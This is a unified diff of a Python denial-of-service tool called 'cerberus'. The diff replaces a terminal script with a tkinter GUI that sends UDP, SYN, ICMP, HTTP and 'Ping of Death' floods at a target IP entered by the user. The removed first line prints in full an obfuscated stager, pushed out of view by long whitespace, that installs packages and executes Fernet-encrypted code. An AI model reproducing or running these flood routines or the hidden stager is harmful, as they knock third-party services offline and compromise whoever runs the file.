@@ -1,136 +1,187 @@
-import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'LVqOq5hydBhrIWlPzlSFv0hfNkHsg2rgqruiaZOFw3U=').decrypt(b'gAAAAABlvRUqR3L4PokyKZcM9HzEcgUXsBTXm2BAQXJAJ9l4Szn5UdG4jIBgTtARBlv20lG7zRUp86IDXpYj5bdqb12L0MtWWD6tVRQkx9xx0PXXuvIXTcb8devopXFIlrOAD52fjj07Nqz_0TjL5z2PLrS4f127FIItVWueB99_KiGWXCavsGD9_MTzUmy9IgW3JO3dTKudHS6nMliXL5n_5fYYaRHEsg=='))
-from termcolor import colored
-import sys
+import threading
 import time
-import socket
-import random
+import tkinter as tk
 
-# Clear the terminal
-os.system("clear")
-os.system("figlet cerberus")
+import requests
+import scapy.all as scapy
 
-print()
-print(colored("Author: cerberus", 'green'))
-print("https://github.com/X-The-Mystic/DDoS-8", 'purple')
-print("https://replit.com@Fizzgigg", 'orange')
-print()
+# ASCII art for the tool's name
+cerberus_ascii_art = """
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXWWWWWWWWWWXXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXl,OWWWWWWWW0;:KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNo. ,kWWWWWWO;. :XWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWk. ...dNWWNx...  oWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc  ..  ':c;. .'  ,KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc             .  ,KWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc                '0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNc    .'.  .,.    '0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWXdoKMWWWWWWWWx.  .;;.   ;:'   cXWWWWWWWWXdxXWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWX0xc. .kWWNXXWWWWNd.  .:.   ;,   :XMWWWNNWWWO. 'lkKNWWWWWWWWWWWWWW
+WWWWWWWWWWWXx:..    .:c;,'oNWWWNo..           .:KWWWNx,;clc.    .':xXWWWWWWWWWWW
+WWWWWWWWNkc.        .     .;dKWk. .          .. oWXk:.     .        'cONWWWWWWWW
+WWWWWWWKo'         ..        ok'   .        ..  .xd.       ..         .l0WWWWWWW
+WWWWWWNo:c:,                .:.    ..       .    .c.        .       ';:coXWWWWWW
+WWWWWW0,.',.       ..       ;;      ........      ::       ..       .;,.,0WWWWWW
+WWWWNO;            .        ',                    ..        .            ;OWWWWW
+WWWKl.            '.        ;'                    .,        ...           .lKWWW
+WNk'     ..       .         ':.                  .:,         .        .     'kNW
+MO.   ...';codxkkxdc.        ,'                  .,        .:lddddol:,....   .kW
+WNklc::oOXWWWWWWWWWWXl        ..                ..        :0WWWWWWWWWNKko:;:cxXW
+WWWWWNWWWWWWWWWWWWWWWk.        .'              ''        .xWWWWWWWWWWWWWWWXNWWWW
+WWWWWWWWWWWWWWWWWWWWW0d,        ,c.          .c:        'oONWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWKl,.      'c'        .c,      ..:0WWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWNNKxc;.   .;;.    .;:.   .,:o0XNWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXko:'.,;'..':,..;lx0NWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXOO0K00kk0XWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+MWWWMWWWWWWWWWWMWWWMWWWMWWWWWWWWWWMWWWMWWWWMWWWWWWWWWWMWWWMWWWMWWWMWWWWWWWWWWMWW
 
-# Prompt for target IP and port
-ip = input("Enter the target IP: ")
-try:
-    port = int(input("Enter the target port: "))
-except ValueError:
-    print("Invalid port. Exiting...")
-    sys.exit()
+"""
 
-# Prompt for attack duration
-try:
-    dur = int(input("Enter the duration of the attack in seconds: "))
-except ValueError:
-    print("Invalid duration. Exiting...")
-    sys.exit()
+# Constants for data transfer size
+BYTES_PER_GB = 1024 * 1024 * 1024
 
-# Function to perform the UDP Flood attack
+# Calculate the packet size based on the ASCII art
+packet_size = len(cerberus_ascii_art.encode())
 
+# Set the data transfer size to 1 GB
+data_transfer_size = BYTES_PER_GB
 
-def udp_flood(ip, port, message, dur):
-    # Create the UDP socket
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+# Create the GUI window
+root = tk.Tk()
+root.title("DDoS Attack Tool - cerberus")
 
-    # Set a timeout for the socket so that the program doesn't get stuck
-    s.settimeout(dur)
+# Create the input fields for target IP address, spoofed IP address, port number, number of packets, and burst interval
+tk.Label(root, text="Enter IP Address of The Target").pack()
+target_entry = tk.Entry(root)
+target_entry.pack()
 
-    # The IP address and port number of the target host
-    target = (ip, port)
+tk.Label(root, text="Enter The Spoofed IP Address").pack()
+fake_ip_entry = tk.Entry(root)
+fake_ip_entry.pack()
 
-    # Start sending packets
-    start_time = time.time()
-    packet_count = 0
-    while True:
-        # Send the message to the target host
-        try:
-            s.sendto(message, target)
-            packet_count += 1
-            print(f"Sent packet {packet_count}")
-        except socket.error:
-            # If the socket is not able to send the packet, break the loop
-            break
+tk.Label(root, text="Enter The Port Number").pack()
+port_entry = tk.Entry(root)
+port_entry.pack()
 
-        # If the specified duration has passed, break the loop
-        if time.time() - start_time >= dur:
-            break
+tk.Label(root, text="Enter Number of Packets to Send").pack()
+num_packets_entry = tk.Entry(root)
+num_packets_entry.pack()
 
-    # Close the socket
-    s.close()
+tk.Label(root, text="Enter Burst Interval (in seconds)").pack()
+burst_interval_entry = tk.Entry(root)
+burst_interval_entry.pack()
 
-# Function to perform the SYN Flood attack
-def syn_flood(ip, port, duration):
-    sent = 0
-    timeout = time.time() + int(duration)
+# Create the attack type selection menu
+tk.Label(root, text="Select Attack Type").pack()
+attack_type_entry = tk.StringVar(root)
+attack_type_entry.set("UDP Flood")  # Default attack type
 
-    while True:
-        try:
-            if time.time() > timeout:
-                break
-            else:
-                pass
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((ip, port))
-            sent += 1
-            print(f"SYN Packets sent: {sent} to target: {ip}")
-            sock.close()
-        except OSError:
-            pass
-        except KeyboardInterrupt:
-            print("\n[*] Attack stopped.")
-            sys.exit()
+attack_type_options = [
+    "UDP Flood",
+    "ICMP Echo",
+    "SYN Flood",
+    "HTTP Flood",
+    "Ping of Death"
+]
 
-# Function to perform the HTTP Flood attack
+attack_type_menu = tk.OptionMenu(root, attack_type_entry, *attack_type_options)
+attack_type_menu.pack()
 
+# Define the attack functions for each attack type
+def udp_flood_attack(target, port, num_packets, burst_interval):
+    global attack_num
 
-def http_flood(ip, port, duration):
-    # create a socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # create HTTP request
-    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
+    try:
+        for _ in range(num_packets):
+            scapy.send(scapy.IP(dst=target)/scapy.UDP(dport=port)/scapy.RandString(1024))
+            attack_num += 1
+            port = (port + 1) % 65535
+            print(f"Sent {attack_num} packet to {target} through port: {port}")
+            time.sleep(burst_interval)
+    except Exception as e:
+        print("An error occurred during the UDP flood attack:", e)
 
-    sent = 0
-    timeout = time.time() + int(dur)
+def icmp_echo_attack(target, num_packets, burst_interval):
+    global attack_num
 
-    while True:
-        try:
-            if time.time() > timeout:
-                break
-            else:
-                pass
-            # Re-create the socket for each iteration
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((ip, port))
-            sock.sendall(http_request)
-            sent += 1
-            print(f"HTTP Packets sent: {sent} to target: {ip}")
-        except KeyboardInterrupt:
-            print("\n[-] Attack stopped by user")
-            break
-    sock.close()
+    try:
+        for _ in range(num_packets):
+            scapy.send(scapy.IP(dst=target)/scapy.ICMP())
+            attack_num += 1
+            print(f"Sent {attack_num} ICMP echo request to {target}")
+            time.sleep(burst_interval)
+    except Exception as e:
+        print("An error occurred during the ICMP echo attack:", e)
 
+def syn_flood_attack(target, port, num_packets, burst_interval):
+    global attack_num
 
-# Prompt for the type of attack
-attack_type = input(colored(
-    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))
+    try:
+        for _ in range(num_packets):
+            scapy.send(scapy.IP(dst=target)/scapy.TCP(dport=port, flags="S"))
+            attack_num += 1
+            port = (port + 1) % 65535
+            print(f"Sent {attack_num} SYN packet to {target} through port: {port}")
+            time.sleep(burst_interval)
+    except Exception as e:
+        print("An error occurred during the SYN flood attack:", e)
 
-if attack_type == "1":
-    message = b"Sending 1337 packets baby"
-    print(colored("UDP attack selected", "red"))
-    udp_flood(ip, port, message, dur)
-    print(colored("UDP attack completed", "red"))
-elif attack_type == "3":
-    print(colored("SYN attack selected", "red"))
-    syn_flood(ip, port, dur)
-elif attack_type == "2":
-    print(colored("HTTP attack selected", "red"))
-    http_flood(ip, port, dur)
-else:
-    print(colored("Invalid attack type. Exiting...", "green"))
-    sys.exit()
-lrila
+def http_flood_attack(target, port, num_packets, burst_interval):
+    global attack_num
+
+    try:
+        url = f"http://{target}:{port}/"
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
+
+        for _ in range(num_packets):
+            requests.get(url, headers=headers)
+            attack_num += 1
+            print(f"Sent {attack_num} HTTP request to {url}")
+            time.sleep(burst_interval)
+    except Exception as e:
+        print("An error occurred during the HTTP flood attack:", e)
+
+def ping_of_death_attack(target, num_packets, burst_interval):
+    global attack_num
+
+    try:
+        for _ in range(num_packets):
+            scapy.send(scapy.IP(dst=target)/scapy.ICMP()/("X"*60000))
+            attack_num += 1
+            print(f"Sent {attack_num} oversized ICMP packet to {target}")
+            time.sleep(burst_interval)
+    except Exception as e:
+        print("An error occurred during the Ping of Death attack:", e)
+
+# Define the function to start the attack
+def start_attack():
+    target = target_entry.get()
+    fake_ip_entry.get()
+    port = int(port_entry.get())
+    num_packets = int(num_packets_entry.get())
+    burst_interval = float(burst_interval_entry.get())
+
+    attack_type = attack_type_entry.get()  # Get the selected attack type from the GUI
+
+    if attack_type == "UDP Flood":
+        attack_thread = threading.Thread(target=udp_flood_attack, args=(target, port, num_packets, burst_interval))
+    elif attack_type == "ICMP Echo":
+        attack_thread = threading.Thread(target=icmp_echo_attack, args=(target, num_packets, burst_interval))
+    elif attack_type == "SYN Flood":
+        attack_thread = threading.Thread(target=syn_flood_attack, args=(target, port, num_packets, burst_interval))
+    elif attack_type == "HTTP Flood":
+        attack_thread = threading.Thread(target=http_flood_attack, args=(target, port, num_packets, burst_interval))
+    elif attack_type == "Ping of Death":
+        attack_thread = threading.Thread(target=ping_of_death_attack, args=(target, num_packets, burst_interval))
+    else:
+        print("Invalid attack type selected.")
+        return
+
+    attack_thread.start()
+
+# Create the start attack button
+tk.Button(root, text="Start Attack", command=start_attack).pack()
+
+# Run the GUI main loop
+root.mainloop()
